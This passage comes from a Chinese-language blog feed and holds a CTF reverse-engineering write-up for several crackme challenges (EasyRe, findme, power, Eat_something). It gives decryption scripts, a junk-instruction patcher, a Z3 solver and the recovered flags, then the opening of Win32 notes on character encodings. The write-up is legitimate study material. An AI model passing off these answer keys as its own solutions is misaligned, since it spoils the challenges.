class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">dec_shift_xor</span><span class="params">(DWORD* mingwen, <span class="keyword">int</span> shiftlen)</span> </span>&#123;</span><br><span class="line"><span class="comment">//pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 13  类似这种加密方式，知道加密后的，解密得到原来的数据</span></span><br><span class="line"><span class="comment">//mingwen指向明文</span></span><br><span class="line"><span class="comment">//shiftlen指向移位的的位数</span></span><br><span class="line"></span><br><span class="line">DWORD data = *mingwen;</span><br><span class="line">DWORD mask = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shiftlen - <span class="number">1</span>; i++) &#123; <span class="comment">// 构造mask</span></span><br><span class="line">mask = (mask &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD zuidi2wei = data &amp; mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">32</span> / shiftlen;</span><br><span class="line">count = <span class="number">32</span> % shiftlen == <span class="number">0</span> ? count : count + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">&#123;</span><br><span class="line">zuidi2wei &lt;&lt;= shiftlen;</span><br><span class="line">mask &lt;&lt;= shiftlen;</span><br><span class="line">data ^= zuidi2wei;</span><br><span class="line">zuidi2wei = data &amp; mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*mingwen = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD* <span class="title">dec</span><span class="params">(<span class="keyword">char</span>* enc_flag, <span class="keyword">char</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD* pdw_flag = (DWORD*)enc_flag;</span><br><span class="line">DWORD* pdw_key = (DWORD*)key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">7</span>; i &gt;=<span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">dec_shift_xor</span>(&amp;pdw_flag[i], <span class="number">17</span>);</span><br><span class="line">pdw_flag[i] ^= pdw_key[(<span class="number">7</span> * i + <span class="number">5</span>) % <span class="number">8</span>];</span><br><span class="line"><span class="built_in">dec_shift_xor</span>(&amp;pdw_flag[i], <span class="number">13</span>);</span><br><span class="line">pdw_flag[i] ^= pdw_flag[(<span class="number">5</span> * i + <span class="number">3</span>) % <span class="number">8</span>];</span><br><span class="line">pdw_flag[i] ^= pdw_key[(<span class="number">7</span> * i + <span class="number">3</span>) % <span class="number">8</span>];</span><br><span class="line"><span class="built_in">dec_shift_xor</span>(&amp;pdw_flag[i], <span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">pdw_flag[i] ^= pdw_key[(<span class="number">7</span> * i + <span class="number">2</span>) % <span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pdw_flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[<span class="number">32</span>] = &#123; <span class="number">12</span>, <span class="number">21</span>, <span class="number">30</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">41</span>, <span class="number">50</span>, <span class="number">59</span>, <span class="number">68</span>, <span class="number">77</span>, <span class="number">86</span>,  <span class="number">95</span>,  <span class="number">88</span>,  <span class="number">97</span>, <span class="number">106</span>, <span class="number">115</span>, <span class="number">124</span>, <span class="number">133</span>, <span class="number">142</span>, <span class="number">151</span>, <span class="number">144</span>, <span class="number">153</span>, <span class="number">162</span>, <span class="number">171</span>, <span class="number">180</span>, <span class="number">189</span>, <span class="number">198</span>, <span class="number">207</span>, <span class="number">200</span>, <span class="number">209</span>, <span class="number">218</span>, <span class="number">227</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> enc_flag[<span class="number">33</span>] = &#123; <span class="number">0x15</span>, <span class="number">0x86</span>, <span class="number">0x0F</span>, <span class="number">0xF9</span>, <span class="number">0x3D</span>, <span class="number">0x7C</span>, <span class="number">0x82</span>, <span class="number">0xC8</span>, <span class="number">0x63</span>, <span class="number">0x32</span>,  <span class="number">0xD7</span>, <span class="number">0x1B</span>, <span class="number">0x54</span>, <span class="number">0x74</span>, <span class="number">0x0C</span>, <span class="number">0xA9</span>, <span class="number">0x05</span>, <span class="number">0x4E</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>,  <span class="number">0x19</span>, <span class="number">0xBC</span>, <span class="number">0xE4</span>, <span class="number">0x53</span>, <span class="number">0x7F</span>, <span class="number">0x39</span>, <span class="number">0x5B</span>, <span class="number">0xA8</span>, <span class="number">0x5E</span>, <span class="number">0xA4</span>,  <span class="number">0xB2</span>, <span class="number">0xD4</span>,<span class="number">0</span>&#125;; <span class="comment">//提取的0X41A058处的数据</span></span><br><span class="line"><span class="built_in">dec</span>(enc_flag, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, enc_flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到 <code>fc5e038d38a57032085441e7fe7010b0</code>，加上 flag{} 得到 <code>flag&#123;fc5e038d38a57032085441e7fe7010b0&#125;</code></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>去花指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x415B53</span></span><br><span class="line">end = <span class="number">0x0415B79</span></span><br><span class="line"></span><br><span class="line">buf = get_bytes(addr, end - addr)</span><br><span class="line">buf_str = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(buf)])</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r&quot;\xE8\x01\x00\x00\x00.\x33\xDB\x33\xC0\x33\xC9\x59\x83\xC0([\s\S])\xBB([\s\S])\x00\x00\x00\xF7\xE3\x83\xC1\x20\x83\xC0([\s\S])\x33\xC3\x51(\x88\x45[\s\S])\xC3.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">s</span>):</span></span><br><span class="line">    eax = <span class="built_in">ord</span>(s.group(<span class="number">1</span>)[<span class="number">0</span>])</span><br><span class="line">    ebx = <span class="built_in">ord</span>(s.group(<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">    tmp = <span class="built_in">ord</span>(s.group(<span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">    c = s.group(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    eax = eax * ebx</span><br><span class="line">    eax += tmp</span><br><span class="line">    eax ^= ebx</span><br><span class="line">    patch_ = <span class="string">&quot;\xB8&quot;</span> + <span class="built_in">chr</span>(eax) + <span class="string">&quot;\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> patch_ + <span class="string">&#x27;\x90&#x27;</span>*(<span class="number">0x25</span>-<span class="number">5</span>-<span class="number">5</span>) + c + <span class="string">&quot;\x90&quot;</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = re.sub(pattern, handler, buf_str, flags=re.I)</span><br><span class="line"></span><br><span class="line">buf_bytes = <span class="built_in">bytes</span>([<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> buf])</span><br><span class="line"></span><br><span class="line">patch_bytes(addr, buf_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="./image-20211109200215569.png" alt="image-20211109200215569"></p><p>Z3模块解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    enc = [<span class="number">0xF90F8615</span>, <span class="number">0xC8827C3D</span>, <span class="number">0x1BD73263</span>, <span class="number">0x0A90C7454</span>,</span><br><span class="line">           <span class="number">0x7D3F4E05</span>, <span class="number">0x53E4BC19</span>, <span class="number">0xA85B397F</span>, <span class="number">0xD4B2A45E</span>]</span><br><span class="line"></span><br><span class="line">    v5 = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    flag = [BitVec(<span class="string">f&quot;flag_<span class="subst">&#123;i&#125;</span>&quot;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    s = Solver()</span><br><span class="line"></span><br><span class="line">    v4 = [<span class="number">0x271E150C</span>, <span class="number">0x3B322920</span>, <span class="number">0x5F564D44</span>, <span class="number">0x736A6158</span>,</span><br><span class="line">          <span class="number">0x978E857C</span>, <span class="number">0xABA29990</span>, <span class="number">0xCFC6BDB4</span>, <span class="number">0xE3DAD1C8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        v5[i] = flag[i] ^ v4[(<span class="number">7</span> * i + <span class="number">2</span>) % <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        v5[j] ^= v5[j] &lt;&lt; <span class="number">7</span></span><br><span class="line">        v5[j] ^= v4[(<span class="number">7</span> * j + <span class="number">3</span>) % <span class="number">8</span>]</span><br><span class="line">        v5[j] ^= v5[(<span class="number">5</span> * j + <span class="number">3</span>) % <span class="number">8</span>]</span><br><span class="line">        v5[j] ^= v5[j] &lt;&lt; <span class="number">13</span></span><br><span class="line">        v5[j] ^= v4[(<span class="number">7</span> * j + <span class="number">5</span>) % <span class="number">8</span>]</span><br><span class="line">        v5[j] ^= v5[j] &lt;&lt; <span class="number">17</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        s.add(v5[i] == enc[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> s.check() == sat</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = [<span class="built_in">int</span>.to_bytes(m[i].as_long(), <span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>).decode()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="EasyRe-Revenge"><a href="#EasyRe-Revenge" class="headerlink" title="EasyRe_Revenge"></a>EasyRe_Revenge</h2><p>此题与EasyRe_Revenge一样，只是把密文换了，替换上图中的enc_flag即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> enc_flag[<span class="number">33</span>] = &#123; <span class="number">66</span>, <span class="number">176</span>, <span class="number">232</span>, <span class="number">238</span>, <span class="number">108</span>, <span class="number">238</span>, <span class="number">208</span>,  <span class="number">87</span>,  <span class="number">50</span>,  <span class="number">75</span>, <span class="number">245</span>, <span class="number">243</span>, <span class="number">214</span>, <span class="number">183</span>, <span class="number">240</span>, <span class="number">211</span>, <span class="number">137</span>, <span class="number">195</span>,  <span class="number">97</span>,  <span class="number">10</span>,  <span class="number">64</span>, <span class="number">186</span>, <span class="number">199</span>,  <span class="number">56</span>,  <span class="number">44</span>, <span class="number">158</span>,  <span class="number">61</span>,  <span class="number">12</span>, <span class="number">132</span>, <span class="number">146</span>,  <span class="number">74</span>, <span class="number">214</span>,<span class="number">0</span> &#125;;</span><br></pre></td></tr></table></figure><p>后来发现，原来EasyRe那道题目，flag直接存在字符串中了，所以把密文换了，才有了这个EasyRe_Revenge</p><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>IDA打开分析</p><p><img src="./image-20211108224257719.png" alt="image-20211108224257719"></p><p>来到 403844 这个位置</p><p><img src="./image-20211108224444634.png" alt="image-20211108224444634"></p><p>很显然这个位置不可能是strcmp，观察发现404840那个地址处还存了个函数的地址 <code>sub_401866</code>，估计程序有地方把403844这个地方的地址给替换掉了</p><p>来到401866位置</p><p><img src="./image-20211108224839058.png" alt="image-20211108224839058"></p><p>分析401767函数，发现是明显的RC4加密</p><p>随便输入一个假的flag，12345678901234567890123456， 然后断下，看加密后的数据</p><p><img src="./image-20211108230241234.png" alt="image-20211108230241234"></p><p>写脚本得到密钥流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_flag = <span class="string">&quot;12345678901234567890123456&quot;</span></span><br><span class="line">enc_fake_flag = [  <span class="number">0xD5</span>, <span class="number">0x25</span>, <span class="number">0xE2</span>, <span class="number">0xB6</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x4B</span>, <span class="number">0xD4</span>, <span class="number">0xB5</span>, <span class="number">0x1B</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0xD0</span>, <span class="number">0x47</span>, <span class="number">0x8F</span>, <span class="number">0xEF</span>, <span class="number">0x35</span>, <span class="number">0x05</span>, <span class="number">0x46</span>, <span class="number">0x48</span>, <span class="number">0xEB</span>, </span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0x21</span>, <span class="number">0x6C</span>, <span class="number">0xB8</span>, <span class="number">0x05</span>, <span class="number">0x8D</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="built_in">ord</span>(fake_flag[i]) ^ enc_fake_flag[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># [228, 23, 209, 130, 196, 175, 124, 236, 140, 43, 176, 226, 116, 187, 218, 3, 50, 126, 113, 219, 189, 19, 95, 140, 48, 187]</span></span><br></pre></td></tr></table></figure><p>然后提取出<code>dword_403040</code>解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0xFFFFFFB7</span>, <span class="number">0x52</span>, <span class="number">0x0FFFFFF85</span>, <span class="number">0x0FFFFFFC1</span>, <span class="number">0x0FFFFFF90</span>, <span class="number">0x0FFFFFFE9</span>, <span class="number">0x7</span>, <span class="number">0xFFFFFFB8</span>, <span class="number">0x0FFFFFFE4</span>, <span class="number">0x1A</span>, <span class="number">0x0FFFFFFC3</span>, <span class="number">0x0FFFFFFBD</span>, <span class="number">0x1D</span>, <span class="number">0x0FFFFFF8E</span>, <span class="number">0x0FFFFFF85</span>, <span class="number">0x46</span>, <span class="number">0x0</span>, <span class="number">0x21</span>, <span class="number">0x44</span>, <span class="number">0x0FFFFFFAF</span>, <span class="number">0x0FFFFFFEF</span>, <span class="number">0x70</span>, <span class="number">0x32</span>, <span class="number">0x0FFFFFFB5</span>, <span class="number">0x11</span>, <span class="number">0x0FFFFFFC6</span>]</span><br><span class="line">key = [<span class="number">228</span>, <span class="number">23</span>, <span class="number">209</span>, <span class="number">130</span>, <span class="number">196</span>, <span class="number">175</span>, <span class="number">124</span>, <span class="number">236</span>, <span class="number">140</span>, <span class="number">43</span>, <span class="number">176</span>, <span class="number">226</span>, <span class="number">116</span>, <span class="number">187</span>, <span class="number">218</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">126</span>, <span class="number">113</span>, <span class="number">219</span>, <span class="number">189</span>, <span class="number">19</span>, <span class="number">95</span>, <span class="number">140</span>, <span class="number">48</span>, <span class="number">187</span>]</span><br><span class="line">flag = [<span class="built_in">chr</span>((enc[i] &amp; <span class="number">0XFF</span>) ^ key[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line"><span class="comment"># SETCTF&#123;Th1s_i5_E2_5tRcm9!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="power"><a href="#power" class="headerlink" title="power"></a>power</h2><p>拿到题目，附件是ARM汇编源文件</p><p>直接用<code>arm-none-eabi-as.exe power</code>编译下生成<code>a.out</code></p><p>IDA打开</p><p><img src="./image-20211109101313110.png" alt="image-20211109101313110"></p><p>发现是AES加密，这里写的是CBC模式，但其实是ECB模式，写脚本解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aescrypt</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key, model, iv</span>):</span></span><br><span class="line">        self.key = self.add_16(key)</span><br><span class="line">        self.model = model</span><br><span class="line">        self.iv = iv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_16</span>(<span class="params">self, par</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(par) == <span class="built_in">str</span>:</span><br><span class="line">            par = par.encode()</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(par) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            par += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> par</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aesencrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        text = self.add_16(text)</span><br><span class="line">        <span class="keyword">if</span> self.model == AES.MODE_CBC:</span><br><span class="line">            self.aes = AES.new(self.key, self.model, self.iv)</span><br><span class="line">        <span class="keyword">elif</span> self.model == AES.MODE_ECB:</span><br><span class="line">            self.aes = AES.new(self.key, self.model)</span><br><span class="line">        self.encrypt_text = self.aes.encrypt(text)</span><br><span class="line">        <span class="keyword">return</span> self.encrypt_text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aesdecrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.model == AES.MODE_CBC:</span><br><span class="line">            self.aes = AES.new(self.key, self.model, self.iv)</span><br><span class="line">        <span class="keyword">elif</span> self.model == AES.MODE_ECB:</span><br><span class="line">            self.aes = AES.new(self.key, self.model)</span><br><span class="line">        self.decrypt_text = self.aes.decrypt(text)</span><br><span class="line">        self.decrypt_text = self.decrypt_text.strip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.decrypt_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    passwd = <span class="string">b&quot;this_is_a_key!!!&quot;</span></span><br><span class="line">    enc_flag_str = <span class="string">&quot;1030a9254d44937bed312da03d2db9adbec5762c2eca7b5853e489d2a140427b&quot;</span></span><br><span class="line">    enc_flag = binascii.unhexlify(enc_flag_str)</span><br><span class="line"></span><br><span class="line">    aescryptor = Aescrypt(passwd, AES.MODE_ECB, <span class="literal">None</span>)  <span class="comment"># ECB</span></span><br><span class="line">    text = aescryptor.aesdecrypt(enc_flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明文:&quot;</span>, text)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 明文: b&#x27;flag&#123;y0u_found_the_aes_12113112&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Eat-something"><a href="#Eat-something" class="headerlink" title="Eat_something"></a>Eat_something</h2><p>核心代码在<code>Eat_something.wasm</code>中</p><p><img src="./image-20211109101808006.png" alt="image-20211109101808006"></p><p>找到工具将wasm转为.o文件  <a href="https://www.52pojie.cn/thread-1438499-1-1.html">https://www.52pojie.cn/thread-1438499-1-1.html</a></p><p>用IDA打开，找到<code>w2c_checkright</code>函数，这是验证flag的地方</p><p><img src="./image-20211109102132206.png" alt="image-20211109102132206"></p><p>核心算法就是这一句<code> v13 != (i32_load(w2c_memory, v16 + 12LL) ^ (2 * v10))</code></p><p>翻译下就是<code>enc[i]  != i ^ (flag[i] * 2)</code></p><p><img src="./image-20211109102352748.png" alt="image-20211109102352748"></p><p><img src="./image-20211109102414299.png" alt="image-20211109102414299"></p><p>将enc提取出来，写脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc =   [<span class="number">0x86</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x85</span>, <span class="number">0xAC</span>, <span class="number">0x89</span>, <span class="number">0xF0</span>, <span class="number">0xAF</span>, <span class="number">0xD8</span>, <span class="number">0x69</span>, </span><br><span class="line">  <span class="number">0xD6</span>, <span class="number">0xDD</span>, <span class="number">0xB2</span>, <span class="number">0xBF</span>, <span class="number">0x6E</span>, <span class="number">0xE5</span>, <span class="number">0xAE</span>, <span class="number">0x99</span>, <span class="number">0xCC</span>, <span class="number">0xD5</span>, </span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0x8B</span>, <span class="number">0xF2</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>, <span class="number">0xE3</span>, <span class="number">0x59</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, </span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x21</span>, <span class="number">0x00</span>]</span><br><span class="line">  </span><br><span class="line">flag  = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    flag .append(<span class="built_in">chr</span>((i ^ enc[i]) // <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line"><span class="comment"># CETCTF&#123;Th0nk_Y0u_DocTOr51&#125; </span></span><br></pre></td></tr></table></figure><p>最后将CETCTF 改为 SETCTF即为flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win32学习笔记</title>
      <link href="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><h3 id="1-ASCII编码"><a href="#1-ASCII编码" class="headerlink" title="1. ASCII编码"></a>1. ASCII编码</h3><p>0 - 7F， 0000 0000——–0111 1111标准ASCII码<br>80 - FF  1000 0000 ——-1111 1111 扩展ASCII码 </p><h3 id="2-GB2312或GB2312-80-针对自己国家-基于扩展ASCII码"><a href="#2-GB2312或GB2312-80-针对自己国家-基于扩展ASCII码" class="headerlink" title="2.GB2312或GB2312-80(针对自己国家)基于扩展ASCII码"></a>2.<strong>GB2312或GB2312-80(针对自己国家)基于扩展ASCII码</strong></h3><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/clipboard.png" class="" title="img"><p>单独看每一个字节，都是扩展ASCII码表中的数据，2个表示一个汉字，这就是GB2312编码，<br>但是GB2312存在很大的弊端，例:<br>将一份GB2312编码的邮件发给一个老外的时候，它看到的是乱码，因为不同国家的解释不一样，Big5编码的思路跟GB2312一样，同样的字节，不同的数据，因为解释的不一样<br>怎么解决问题这个乱码问题呢？UNICODE出现</p><h3 id="3-UNICODE"><a href="#3-UNICODE" class="headerlink" title="3. UNICODE"></a>3. <strong>UNICODE</strong></h3><p>这是一个编码方案，说白了就是一张包含全世界所有文字的一个编码表，只要这个世界上存在的文字符号，统统给你一个唯一的编码:<br>UNICODE编码范围是: 0 - 0X10FFFF， 可以容纳100多万个符号！</p><p><strong>UNICODE 的问题？</strong></p><p>假如说： </p><ol><li>中: 0x12 34</li><li>国:0x01 23 45</li><li>A: 0x41</li></ol><p>用多少个字节来存储呢？UNICODE只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储</p><h3 id="4-如何存储UNICODE"><a href="#4-如何存储UNICODE" class="headerlink" title="4. 如何存储UNICODE"></a>4. 